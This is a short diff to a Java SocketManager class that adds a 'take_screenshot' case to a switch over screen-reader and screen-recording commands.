@@ -2212,6 +2212,7 @@ public class SocketManager {
             case "screen_reader_stop":
             case "screen_reader_stream_start":
             case "screen_reader_stream_stop":
+            case "take_screenshot":
             case "list_screen_recordings":
             case "get_screen_recording":
             case "delete_screen_recording":
